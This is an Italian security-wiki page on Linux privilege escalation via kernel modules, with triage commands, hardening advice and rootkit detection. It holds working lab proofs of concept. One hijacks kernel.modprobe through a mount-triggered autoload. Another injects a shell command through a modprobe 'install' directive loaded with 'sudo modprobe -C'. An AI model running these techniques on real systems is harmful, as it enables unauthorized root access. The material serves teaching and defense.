# Moduli del kernel e abuso di modprobe

{{#include ../../banners/hacktricks-training.md}}

## Configurazioni errate dei moduli del kernel e del caricamento dei moduli

Il supporto ai moduli del kernel è un ambito ad alto impatto durante la revisione dell’escalation dei privilegi su Linux. Non considerare di per sé sfruttabile ogni messaggio relativo a moduli non firmati, ma usalo per rispondere a domande pratiche.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- L’utente corrente può caricare moduli tramite `sudo`, capabilities o un percorso helper scrivibile?
- Il caricamento dei moduli è ancora abilitato?
- L’applicazione delle firme dei moduli è disabilitata?
- Le directory dei moduli, i file dei moduli o i percorsi di configurazione di `modprobe.d` sono scrivibili?<sup>[[16]](#references)</sup>
- È possibile leggere i log del kernel per confermare cosa è successo?

Il triage rapido inizia con i seguenti controlli dello stato dei moduli, delle firme, dei log e dell’albero dei moduli.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretazione:

- `modules_disabled=1` significa che i moduli non possono essere né caricati né scaricati e che il valore non può essere reimpostato su `0` prima del riavvio.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` nella riga di comando del kernel o `CONFIG_MODULE_SIG_FORCE=y` richiede moduli validamente firmati; in caso contrario, i moduli non firmati potrebbero essere caricati e taintare il kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` non impone restrizioni a `dmesg`; quando è impostato su `1`, l'accesso richiede `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- I percorsi scrivibili sotto `/lib/modules/$(uname -r)/` sono pericolosi perché `modprobe` cerca in quell'albero e nei relativi dati sulle dipendenze quando carica i moduli.<sup>[[8]](#references)</sup>

### Caricamento di un modulo e lettura dell'output del kernel

Se hai l'autorizzazione legittima per caricare un modulo locale, `insmod` inserisce il file `.ko` esatto che gli fornisci. La funzione init del modulo viene eseguita durante il caricamento e i messaggi scritti con `printk()` vengono inviati al buffer del log del kernel, che normalmente si legge con `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un flusso di lavoro di revisione essenziale usa `modinfo` per esaminare i metadati, `insmod` e `rmmod` per caricare e rimuovere un modulo, `lsmod` per verificare lo stato di caricamento e `dmesg` per esaminare i log del kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Se `sudo -l` consente `insmod`, `modprobe` o un wrapper che li esegue, consideralo un caso critico: `sudo -l` elenca i privilegi dell'utente che invoca il comando e per caricare un modulo del kernel è necessario `CAP_SYS_MODULE`. Consulta [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) per i percorsi basati direttamente sulle capability.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` consentito tramite sudo

Una regola sudo che consente a un utente di eseguire `insmod` non è paragonabile al consentire l'uso di un normale strumento amministrativo. Il codice di inizializzazione del modulo viene eseguito durante il caricamento, quindi la domanda pratica da porsi durante la revisione è se l'utente possa scegliere o modificare il modulo da caricare.<sup>[[3]](#references)</sup>

Il seguente flusso di revisione generico ripete i controlli di ispezione, caricamento, stato, log e rimozione per un modulo candidato.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Se l'utente può fornire un `.ko` arbitrario, in una valutazione autorizzata questa regola va considerata una compromissione completa del sistema. Una prassi operativa più sicura consiste nell'evitare di delegare il caricamento dei moduli tramite sudo; se è inevitabile, occorre limitare il percorso esatto, la proprietà, i permessi, la policy di firma e la procedura di rimozione.<sup>[[3]](#references)[[10]](#references)</sup>

Per un innocuo schema di compilazione dei moduli in un laboratorio controllato, di seguito sono mostrati un sorgente minimale e un Makefile; la forma `make -C /lib/modules/$(uname -r)/build M=$PWD` segue il workflow kbuild documentato dal kernel per i moduli esterni.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Compila e carica solo in un laboratorio autorizzato; kbuild compila il modulo esterno e i comandi di caricamento/rimozione richiamano le interfacce dei moduli del kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Verifiche di abuso di `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` indica l’helper userspace che il kernel esegue per le richieste di caricamento automatico dei moduli; questo sysctl influisce sul caricamento automatico, non sull’inserimento esplicito dei moduli. Se un attaccante può modificarlo impostandolo su un percorso eseguibile scrivibile e attivare una richiesta di modulo, quell’helper diventa un percorso per l’esecuzione di codice con privilegi. Impostarlo su una stringa vuota disabilita le richieste di caricamento automatico; se `CONFIG_STATIC_USERMODEHELPER=y`, un valore non vuoto viene sovrascritto dal percorso dell’helper statico incorporato in fase di compilazione.<sup>[[1]](#references)</sup>

Controlla il percorso corrente dell’helper tramite l’interfaccia sysctl del kernel e verifica proprietario e permessi del file di destinazione.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Verifica se sysctl, le regole sudo delegate o le capabilities dei file possono essere influenzate.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Il seguente pattern, da usare solo in laboratorio, modifica il percorso dell’helper e genera una richiesta documentata di autocaricamento di un modulo; usalo solo su un sistema isolato e autorizzato.<sup>[[1]](#references)</sup>

Nei kernel Linux attuali, non usare un eseguibile sconosciuto come trigger generico: il legacy autoload dei moduli per formati binari personalizzati è stato rimosso in Linux 6.14, mentre la documentazione del kernel identifica un tipo di filesystem sconosciuto come percorso che genera una richiesta di autocaricamento di un modulo.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Nei sistemi hardened, l’operazione dovrebbe fallire se le autorizzazioni impediscono le scritture non privilegiate in `kernel.modprobe`, il percorso dell’helper non è scrivibile o il caricamento automatico dei moduli è disabilitato.<sup>[[1]](#references)</sup>

### Configurazione `modprobe.d` scrivibile e `sudo modprobe -C`

Prima di risolvere un modulo, `modprobe` legge i file `.conf` dalle directory di configurazione, come `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` e `/lib/modprobe.d`, seguendo l’ordine di precedenza. Un file con lo stesso nome in una directory con priorità più alta nasconde quello nella directory con priorità inferiore. Ancora più importante, una direttiva `install <module> <command>` esegue un comando shell arbitrario **invece di** inserire il modulo. Pertanto, un percorso di configurazione scrivibile può consentire l’esecuzione differita di comandi con le credenziali di un successivo utente privilegiato che esegue `modprobe`; la verifica delle firme dei moduli del kernel non autentica questo comando userspace.<sup>[[16]](#references)</sup>

Controlla i permessi di directory e file, quindi esamina la configurazione effettiva. `modprobe -n -v` è sicuro per verificare la risoluzione, perché la modalità dry-run non inserisce il modulo né esegue comandi `install`/`remove`. Preferisci `modprobe -c` alla forma legacy `--showconfig`, che la documentazione attuale di kmod indica come destinata alla rimozione dopo kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Una regola sudo senza restrizioni per `modprobe` è sfruttabile anche quando file `.ko` arbitrari non superano la verifica della firma: `-C` seleziona una directory di configurazione controllata dall’attaccante, da cui il processo avviato da sudo può eseguire un comando `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Per la mitigazione, non concedere tramite sudo l’esecuzione di `modprobe` senza restrizioni sugli argomenti, mantieni tutte le directory di configurazione di proprietà di root e non scrivibili, e verifica la presenza di direttive `install`/`remove` inaspettate. Quando un flusso di lavoro amministrativo attendibile deve ignorare tali direttive per un modulo, `modprobe --ignore-install` le ignora per il modulo specificato, ma le dipendenze possono avere comandi propri.<sup>[[8]](#references)[[16]](#references)</sup>

### Verifica delle directory `/lib/modules` scrivibili

Le directory dei moduli scrivibili possono consentire la sostituzione di moduli, l’inserimento di moduli malevoli o l’abuso del caricamento automatico, a seconda di come viene invocato successivamente `modprobe`; `modprobe` cerca in `/lib/modules/$(uname -r)` e usa i dati delle dipendenze per risolvere i moduli.<sup>[[8]](#references)</sup>

Verifica i file dei moduli scrivibili e i metadati delle dipendenze e degli alias nell’albero dei moduli della versione del kernel attiva.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Se trovi contenuto di un modulo scrivibile, esamina come modprobe risolve le dipendenze e come modinfo riporta i metadati del modulo.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Note difensive:

- Mantieni `/lib/modules` di proprietà di `root:root` e non scrivibile dagli utenti.<sup>[[8]](#references)</sup>
- Imposta `kernel.modules_disabled=1` dopo l'avvio, ove possibile dal punto di vista operativo.<sup>[[1]](#references)</sup>
- Applica la firma dei moduli sui sistemi che richiedono moduli caricabili.<sup>[[2]](#references)</sup>
- Monitora le scritture in `/proc/sys/kernel/modprobe`, `/lib/modules` e nelle directory di configurazione `modprobe.d`, oltre all'esecuzione inattesa di `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage dei rootkit basati su moduli

Un modulo malevolo può agganciarsi alle syscall, alle viste di VFS o di `/proc`, ai percorsi di rete o ai controlli delle credenziali per nascondere processi e file, reindirizzare il traffico o intercettare segreti. Può anche rimuoversi dall'elenco dei moduli mostrato da `lsmod`. La persistenza può derivare da alias o regole di installazione in `modprobe.d`, da `/etc/modules-load.d`, da un'unità systemd, dai contenuti di initramfs o dalla sostituzione di un file `.ko` legittimo. Un risultato normale di `lsmod` costituisce un indizio utile, ma una compromissione a livello kernel può rendere inaffidabili gli elenchi forniti dal kernel. Correlare i moduli caricati, i file su disco, la configurazione di avvio, i log di caricamento dei moduli e la telemetria esterna attendibile.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Esamina nomi, percorsi, dipendenze, firme e tempi di caricamento dei moduli inattesi. I messaggi relativi al taint del kernel e ai moduli non firmati sono indizi, non prove della presenza di un rootkit. Se sospetti la presenza di un rootkit, raccogli prove da un’immagine attendibile o da un ambiente di ripristino prima di fare affidamento sull’output del kernel in esecuzione. La pagina [valutazione delle vulnerabilità del kernel](kernel-vulnerability-assessment.md) tratta la configurazione e l’esposizione diagnostica, inclusi tracefs e gli oggetti BPF fissati.

## References

- [1] [Documentazione di /proc/sys/kernel/ — Documentazione del kernel Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Funzionalità di firma dei moduli del kernel — Documentazione del kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Nozioni di base sui driver — Documentazione del kernel Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Registrazione dei messaggi con printk — Documentazione del kernel Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilazione di moduli esterni — Documentazione del kernel Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Unione del tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
